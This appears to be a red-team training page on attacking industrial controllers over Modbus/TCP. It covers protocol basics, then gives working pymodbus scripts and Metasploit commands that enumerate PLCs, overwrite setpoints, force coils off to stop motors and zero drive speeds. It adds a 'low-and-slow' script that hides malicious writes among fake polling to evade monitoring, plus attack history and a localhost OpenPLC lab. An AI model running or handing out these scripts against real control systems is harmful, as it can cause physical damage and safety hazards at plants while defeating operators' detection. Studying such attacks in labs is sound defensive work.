---
layout: training-page
title: "Modbus/TCP Attacks — Red Team Academy"
module: "OT/ICS Security"
tags:
  - modbus
  - ics-protocols
  - plc-attacks
  - scada-exploitation
page_key: "ot-ics-modbus-attacks"
render_with_liquid: false
---

# Modbus/TCP Attacks

Modbus is the oldest and most widely deployed industrial protocol, created by Modicon in 1979. It has zero built-in authentication and zero encryption. Any device on the network that can reach a Modbus-enabled PLC can read sensor values, write control outputs, and change operational parameters — with no credentials required.

---

## Protocol Primer

### Modbus Data Model

Modbus defines four data tables:

| Table | Type | Access | Address Range | Description |
|-------|------|--------|--------------|-------------|
| Coils | 1-bit | Read/Write | 00001–09999 | Discrete digital outputs (relay states, motor on/off) |
| Discrete Inputs | 1-bit | Read Only | 10001–19999 | Digital inputs from field (limit switches, sensors) |
| Input Registers | 16-bit | Read Only | 30001–39999 | Analog inputs (temperature, pressure readings) |
| Holding Registers | 16-bit | Read/Write | 40001–49999 | Setpoints, parameters, control values |

### Function Codes (FC)

```
FC01  (0x01): Read Coils
FC02  (0x02): Read Discrete Inputs
FC03  (0x03): Read Holding Registers
FC04  (0x04): Read Input Registers
FC05  (0x05): Write Single Coil        ← ATTACK VECTOR
FC06  (0x06): Write Single Register    ← ATTACK VECTOR
FC08  (0x08): Diagnostics/Loopback
FC11  (0x0B): Get Comm Event Counter
FC15  (0x0F): Write Multiple Coils     ← ATTACK VECTOR
FC16  (0x10): Write Multiple Registers ← ATTACK VECTOR
FC17  (0x11): Report Slave ID          ← RECON
FC22  (0x16): Mask Write Register
FC23  (0x17): Read/Write Multiple Registers
FC43  (0x2B): Read Device Identification ← RECON (Encapsulated Interface Transport)
```

### Modbus TCP Frame Structure

```
[MBAP Header (7 bytes)] [PDU]
Transaction ID (2B) | Protocol ID (2B = 0x0000) | Length (2B) | Unit ID (1B)
[Function Code (1B)] [Data (variable)]
```

### Modbus RTU vs Modbus TCP

| Aspect | Modbus RTU | Modbus TCP |
|--------|-----------|-----------|
| Transport | RS-485/RS-232 serial | Ethernet TCP port 502 |
| CRC | Yes (2-byte CRC16) | No CRC (TCP handles integrity) |
| MBAP header | No | Yes |
| Attack vector | Physical serial access or serial-to-Ethernet converter | Network access |
| Prevalence | Older field devices | Modern PLCs and I/O modules |

**Key Insight**: Many facilities have serial-to-Ethernet converters (e.g., Moxa NPort, Digi AnywhereUSB) that expose Modbus RTU devices over TCP. These create attack paths that didn't exist when the original field devices were deployed.

---

## Reconnaissance

### Nmap Discovery

```bash
# Basic Modbus device detection
nmap -sV -p 502 --script modbus-discover <target>

# Example output:
# 502/tcp open modbus
# | modbus-discover:
# |   Unit ID 1:
# |     Slave ID Data: \xFF\xFF
# |     Device identification: Schneider Electric BMX P34 2020
# |_  Unit ID 255:
#       Slave ID Data: ...

# Scan entire subnet for Modbus devices
nmap -T2 -p 502 --open <subnet>/24

# With OS detection and service version
nmap -O -sV -p 502 --script modbus-discover <target>
```

### mbtget — Modbus Register Reader

```bash
# Install mbtget
apt-get install mbtget
# or: git clone https://github.com/sourceperl/mbtget

# Read holding registers (FC03) - unit 1, starting at address 0, count 10
mbtget -a <target> -u 1 -r 3 -d 0 -c 10

# Read coils (FC01) - all 2000 coils
mbtget -a <target> -u 1 -r 1 -d 0 -c 2000

# Report slave ID (FC17) for device identification
mbtget -a <target> -u 1 -r 17

# Read device identification (FC43)
mbtget -a <target> -u 1 -r 43
```

### Python with pymodbus for Full Enumeration

```python
#!/usr/bin/env python3
# modbus_enum.py - Full Modbus device enumeration
from pymodbus.client import ModbusTcpClient
from pymodbus.exceptions import ModbusException
import sys

def enumerate_modbus(host, port=502):
    client = ModbusTcpClient(host, port=port)
    client.connect()
    
    print(f"[*] Connected to {host}:{port}")
    print("[*] Enumerating Unit IDs 1-247...")
    
    active_units = []
    for unit_id in range(1, 248):
        result = client.read_holding_registers(address=0, count=1, slave=unit_id)
        if not result.isError():
            active_units.append(unit_id)
            print(f"[+] Active Unit ID: {unit_id}")
    
    for uid in active_units:
        print(f"\n[*] Enumerating Unit ID {uid}:")
        
        # Read all coils (0-2000)
        print("  [*] Reading Coils (FC01):")
        result = client.read_coils(address=0, count=200, slave=uid)
        if not result.isError():
            print(f"  [+] Coils 0-199: {result.bits[:10]}...")
        
        # Read discrete inputs (0-200)
        print("  [*] Reading Discrete Inputs (FC02):")
        result = client.read_discrete_inputs(address=0, count=200, slave=uid)
        if not result.isError():
            print(f"  [+] Inputs 0-199: {result.bits[:10]}...")
        
        # Read input registers (0-100)
        print("  [*] Reading Input Registers (FC04):")
        result = client.read_input_registers(address=0, count=50, slave=uid)
        if not result.isError():
            print(f"  [+] Registers 0-49: {result.registers[:10]}...")
        
        # Read holding registers (0-100)
        print("  [*] Reading Holding Registers (FC03):")
        result = client.read_holding_registers(address=0, count=50, slave=uid)
        if not result.isError():
            print(f"  [+] Hold Regs 0-49: {result.registers[:10]}...")
    
    client.close()

if __name__ == "__main__":
    enumerate_modbus(sys.argv[1])
```

### ModbusPal — GUI Modbus Simulator and Client

```bash
# ModbusPal: Java-based Modbus master/slave simulator
# Download: https://sourceforge.net/projects/modbuspal/
java -jar ModbusPal.jar

# Useful for:
# - Simulating Modbus slaves for lab setup
# - Acting as Modbus master for manual register exploration
# - Understanding register maps before automated attacks
```

---

## Exploitation

### FC06: Write Single Register

Writing to holding registers can change process setpoints, speed references, and control parameters.

```python
#!/usr/bin/env python3
# modbus_write_register.py
from pymodbus.client import ModbusTcpClient

def write_register(host, unit_id, register_address, value):
    """
    Write a single holding register value.
    Example: Change motor speed setpoint from 1500 RPM to 0
    """
    client = ModbusTcpClient(host, port=502)
    client.connect()
    
    # Read current value first (always document)
    current = client.read_holding_registers(
        address=register_address, count=1, slave=unit_id
    )
    print(f"[*] Current value at register {register_address}: {current.registers[0]}")
    
    # Write new value (FC06)
    result = client.write_register(
        address=register_address, value=value, slave=unit_id
    )
    
    if result.isError():
        print(f"[-] Write failed: {result}")
    else:
        print(f"[+] Write successful! Register {register_address} = {value}")
    
    # Verify write
    verify = client.read_holding_registers(
        address=register_address, count=1, slave=unit_id
    )
    print(f"[*] Verified value: {verify.registers[0]}")
    
    client.close()

# Example: Change setpoint at register 40 on Unit ID 1
write_register("192.168.1.100", unit_id=1, register_address=40, value=0)
```

### FC05: Write Single Coil (Force Physical State)

Coils directly control digital outputs — motor contactors, valve solenoids, alarm relays.

```python
#!/usr/bin/env python3
# modbus_force_coil.py
from pymodbus.client import ModbusTcpClient

def force_coil(host, unit_id, coil_address, state):
    """
    Force a single coil output.
    state: True = ON (0xFF00), False = OFF (0x0000)
    
    WARNING: This directly changes a physical output.
    Could start/stop motors, open/close valves, 
    trigger/clear alarms.
    """
    client = ModbusTcpClient(host, port=502)
    client.connect()
    
    # Read current state
    current = client.read_coils(address=coil_address, count=1, slave=unit_id)
    print(f"[*] Current state of coil {coil_address}: {'ON' if current.bits[0] else 'OFF'}")
    
    # Write coil (FC05)
    result = client.write_coil(
        address=coil_address, value=state, slave=unit_id
    )
    
    if result.isError():
        print(f"[-] Write failed: {result}")
    else:
        state_str = "ON" if state else "OFF"
        print(f"[+] Coil {coil_address} forced {state_str}")
    
    client.close()

# Force coil 0 OFF on Unit ID 1 (could stop a motor)
force_coil("192.168.1.100", unit_id=1, coil_address=0, state=False)
```

### FC16: Write Multiple Registers

```python
#!/usr/bin/env python3
# Write multiple registers at once - useful for changing multiple setpoints atomically
from pymodbus.client import ModbusTcpClient

client = ModbusTcpClient("192.168.1.100", port=502)
client.connect()

# Write values [0, 0, 0, 0, 0] to registers 40-44 (FC16)
# Example: Zero out all speed setpoints for a drive system
result = client.write_registers(
    address=40,
    values=[0, 0, 0, 0, 0],
    slave=1
)

if not result.isError():
    print("[+] Multiple registers written successfully")

client.close()
```

---

## Metasploit Modules

```bash
# Modbus detection and enumeration
msf6 > use auxiliary/scanner/scada/modbusdetect
msf6 auxiliary(scanner/scada/modbusdetect) > set RHOSTS 192.168.1.0/24
msf6 auxiliary(scanner/scada/modbusdetect) > set THREADS 5
msf6 auxiliary(scanner/scada/modbusdetect) > run

# Modbus client for manual read/write operations
msf6 > use auxiliary/admin/scada/modbusclient
msf6 auxiliary(admin/scada/modbusclient) > options

# Read holding registers
msf6 auxiliary(admin/scada/modbusclient) > set RHOSTS 192.168.1.100
msf6 auxiliary(admin/scada/modbusclient) > set DATA_ADDRESS 0
msf6 auxiliary(admin/scada/modbusclient) > set UNIT_ID 1
msf6 auxiliary(admin/scada/modbusclient) > set ACTION READ_REGISTERS
msf6 auxiliary(admin/scada/modbusclient) > run

# Write a register
msf6 auxiliary(admin/scada/modbusclient) > set ACTION WRITE_REGISTER
msf6 auxiliary(admin/scada/modbusclient) > set DATA_ADDRESS 40
msf6 auxiliary(admin/scada/modbusclient) > set DATA 0
msf6 auxiliary(admin/scada/modbusclient) > run

# Write a coil
msf6 auxiliary(admin/scada/modbusclient) > set ACTION WRITE_COIL
msf6 auxiliary(admin/scada/modbusclient) > set DATA_ADDRESS 0
msf6 auxiliary(admin/scada/modbusclient) > set DATA false
msf6 auxiliary(admin/scada/modbusclient) > run
```

---

## Detection Evasion: Mimicking Legitimate Traffic

OT networks have predictable, regular traffic patterns. Anomalies stand out to NTA tools.

### Understanding Legitimate Polling

Before attacking, capture baseline traffic:

```bash
# Capture Modbus traffic for baseline analysis
tcpdump -i eth0 -w modbus_baseline.pcap port 502

# Analyze polling patterns
tshark -r modbus_baseline.pcap -Y modbus -T fields \
  -e frame.time_delta \
  -e ip.src \
  -e ip.dst \
  -e modbus.func_code \
  -e modbus.reference_num \
  -e modbus.word_cnt

# Typical pattern: SCADA polls same registers every 1-5 seconds
# Inject writes at same timing to blend in
```

### Low-and-Slow Modbus Attack

```python
#!/usr/bin/env python3
# Spread writes over time to mimic normal polling behavior
import time
import random
from pymodbus.client import ModbusTcpClient

def stealthy_write_campaign(host, unit_id, targets):
    """
    targets: list of (register_address, target_value) tuples
    Executes writes interspersed with legitimate-looking reads
    """
    client = ModbusTcpClient(host, port=502)
    client.connect()
    
    for reg_addr, target_val in targets:
        # First perform several read operations (looks like polling)
        for _ in range(random.randint(3, 8)):
            client.read_holding_registers(
                address=random.randint(0, 100), count=10, slave=unit_id
            )
            time.sleep(random.uniform(0.8, 1.2))  # Mimic ~1s polling interval
        
        # Execute the write (embedded among reads)
        client.write_register(
            address=reg_addr, value=target_val, slave=unit_id
        )
        print(f"[*] Written {target_val} to register {reg_addr}")
        
        # Continue reading after write
        time.sleep(random.uniform(0.8, 1.2))
    
    client.close()

targets = [(40, 0), (41, 0), (42, 0)]
stealthy_write_campaign("192.168.1.100", 1, targets)
```

---

## Real-World Attacks

### TRITON/TRISIS (2017) — Safety System Attack

The most sophisticated ICS malware ever deployed targeted Schneider Electric's Triconex Safety Instrumented System (SIS) at a petrochemical plant in Saudi Arabia.

**Technical Details**:
- Deployed via IT network compromise → lateral movement to engineering workstation
- Communicated with Safety PLCs via **TriStation protocol** (proprietary, Schneider)
- Attempted to reprogram SIS controllers to fail-safe while spoofing valid states
- Accidental code bug caused SIS to trip to safe state, alerting operators
- If successful: would have disabled emergency shutdown, enabling deliberate physical damage

**MITRE ICS Techniques Used**:
- T0862 Supply Chain Compromise
- T0800 Activate Firmware Update Mode
- T0858 Change Operating Mode
- T0807 Command-Line Interface

### BlackEnergy / Industroyer Modbus Component (2016)

Industroyer (Sandworm, Ukraine 2016) included a Modbus data wiping module:

```
Component Analysis:
- modbus_data_wiper: Sent FC06 writes with 0x0000 to all holding registers
- Targeted specific unit IDs identified during reconnaissance
- Executed after Industroyer main payload delivered blackout
- Designed to complicate recovery by corrupting device configurations
```

### Common CVEs

| CVE | Device | Description |
|-----|--------|-------------|
| CVE-2013-2801 | Moxa MiiNePort | Unauthenticated Modbus access leads to firmware modification |
| CVE-2016-9360 | GE MDS PulseNET | Hardcoded credentials + Modbus access |
| CVE-2018-7790 | Schneider Modicon | Improper access control on Modbus FC commands |
| CVE-2021-22786 | Schneider Modicon M340 | Unauthenticated access to Modbus TCP |
| CVE-2022-45789 | Schneider Modicon | Authentication bypass via Modbus requests |

---

## Lab Exercise: Attack OpenPLC via Modbus

```bash
# 1. Start OpenPLC (see Overview module for setup)
# OpenPLC exposes Modbus TCP on port 502 by default

# 2. Discover the device
nmap -p 502 --script modbus-discover localhost

# 3. Read all registers
python3 modbus_enum.py 127.0.0.1

# 4. Identify the coil controlling the simulated output
# (OpenPLC ladder logic maps %QX0.0 to Coil address 0)
mbtget -a 127.0.0.1 -u 1 -r 1 -d 0 -c 10

# 5. Force the output coil
# This simulates turning off a digital output in the PLC program
python3 -c "
from pymodbus.client import ModbusTcpClient
c = ModbusTcpClient('127.0.0.1', port=502)
c.connect()
print('Coil state:', c.read_coils(0, 1, slave=1).bits[0])
c.write_coil(0, False, slave=1)
print('After write:', c.read_coils(0, 1, slave=1).bits[0])
c.close()
"

# 6. Verify impact in OpenPLC web interface (http://localhost:8080)
# Monitoring dashboard shows output state changed
```

---

*Next: [DNP3 Protocol Attacks](dnp3-attacks.md)*
